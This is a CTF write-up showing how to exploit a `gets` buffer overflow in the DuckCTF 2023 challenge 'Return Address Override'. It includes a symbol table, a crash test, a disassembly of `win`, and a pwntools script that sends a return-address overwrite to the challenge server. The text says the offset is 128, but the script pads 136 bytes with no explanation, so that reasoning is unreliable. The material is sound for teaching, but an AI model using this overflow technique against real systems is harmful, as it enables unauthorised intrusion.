---
layout: post
title: Return Address Override - DuckCTF 2023
date: 2023-08-04T00:00:00.000Z
description: Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows.
author:	lachlan 
categories:
  - ctf
  - write-ups
  - pwn 
---

This challenge provides us with the binary, so let us begin by printing the objects in the binary with `objdump -t`:

```
SYMBOL TABLE:
0000000000000000 l    df *ABS*	0000000000000000 crt1.c
0000000000000000 l    df *ABS*	0000000000000000 crtstuff.c
0000000000403e60 l     O .ctors	0000000000000000 __CTOR_LIST__
0000000000403e70 l     O .dtors	0000000000000000 __DTOR_LIST__
0000000000402070 l     O .eh_frame	0000000000000000 __EH_FRAME_BEGIN__
0000000000401090 l     F .text	0000000000000000 deregister_tm_clones
00000000004010c0 l     F .text	0000000000000000 register_tm_clones
0000000000401100 l     F .text	0000000000000000 __do_global_dtors_aux
0000000000404020 l     O .bss	0000000000000001 completed.2
0000000000404028 l     O .bss	0000000000000008 dtor_idx.1
0000000000401190 l     F .text	0000000000000000 frame_dummy
0000000000404040 l     O .bss	0000000000000030 object.0
0000000000000000 l    df *ABS*	0000000000000000 crtstuff.c
0000000000403e68 l     O .ctors	0000000000000000 __CTOR_END__
00000000004020d0 l     O .eh_frame	0000000000000000 __FRAME_END__
00000000004012b0 l     F .text	0000000000000000 __do_global_ctors_aux
0000000000000000 l    df *ABS*	0000000000000000 med.c
0000000000000000 l    df *ABS*	0000000000000000
0000000000403e80 l     O .dynamic	0000000000000000 _DYNAMIC
0000000000402000 l       .eh_frame_hdr	0000000000000000 __GNU_EH_FRAME_HDR
0000000000403fd0 l     O .got	0000000000000000 _GLOBAL_OFFSET_TABLE_
0000000000000000       F *UND*	0000000000000000 gets
0000000000404008 g     O .data	0000000000000000 .hidden __TMC_END__
0000000000403e78 g     O .dtors	0000000000000000 .hidden __DTOR_END__
0000000000000000       F *UND*	0000000000000000 puts
0000000000404000 g     O .data	0000000000000000 .hidden __dso_handle
0000000000401000 g     F .init	0000000000000001 _init
00000000004011d3 g     F .text	00000000000000a0 getName
00000000004011bd g     F .text	0000000000000016 win
0000000000401050 g       .text	0000000000000000 _start
0000000000401066 g     F .text	0000000000000024 _start_c
0000000000404008 g       .bss	0000000000000000 __bss_start
0000000000401273 g     F .text	000000000000002f main
00000000004012f1 g     F .fini	0000000000000001 _fini
0000000000404008 g       .data	0000000000000000 _edata
0000000000404078 g       .bss	0000000000000000 _end
0000000000000000       F *UND*	0000000000000000 __libc_start_main
0000000000404070 g     O .bss	0000000000000008 FLAG
```

As we can see, `gets` is being used, which means this program is likely vulnerable to a buffer overflow with `gets`. So, without trying anything else yet, let us see if we can cause a segfault.

```
python -c "print('a' * 10000)" | ./med
```

Upon running the command above, we get the following error;
```
Segmentation fault (core dumped)
```
Awesome! This means we over-wrote the return address pushed to the stack when calling a function that calls `gets`, and thus when the function tried to return, it returned to a location that does not exist in the binary, therefore throwing an error. Hence, if we work hard enough, we can tell the function to return to a location we desire (perhaps a part of the binary that prints the flag).

To do this, we need to:

1) Determine exactly how many characters are required in our input before we start changing the return address (this is called the offset)
2) Find a location that runs the code we want to run (say print the flag)

The first job is easy enough. We know that 10000 characters is too many, so how about 500? That also segfaults. So how about 250? Yep, still segfaults. What about 100? Nope. Runs fine. 128? Yes. 127? Nope! This means that the offset is 128 characters (it is not 127 as there is a new line character, so when we entered 127 characters, there were really 128 characters sent, all of which did not change the return address). So our payload should be 128 random characters followed by our desired address. 

To find a location in the code we might want to jump to, we can look at our symbols table again. We see that there is a function called `win`, and if we look at the assembly for `win` (with `objdump -t`);

```
00000000004011bd <win>:
  4011bd:       55                      push   %rbp
  4011be:       48 89 e5                mov    %rsp,%rbp
  4011c1:       48 8b 05 a8 2e 00 00    mov    0x2ea8(%rip),%rax        # 404070 <FLAG>
  4011c8:       48 89 c7                mov    %rax,%rdi
  4011cb:       e8 60 fe ff ff          call   401030 <puts@plt>
  4011d0:       90                      nop
  4011d1:       5d                      pop    %rbp
  4011d2:       c3                      ret
```

we can see that it will print the flag. So let us jump to `win` which is at address `0x004011bd`.

The following program does just this
```python=
from pwn import *

# Remote
shell = remote('chall.duckctf.com', 30003)

# Local with test flag
#shell = process(['./med', "flag{test flag}"])

winAddress = 0x004011bd

payload = b'a' * 136 + p64(winAddress)

shell.sendline(payload)
shell.interactive()
```

Running this gives the flag `quack{a_simple_return_address_override}`.
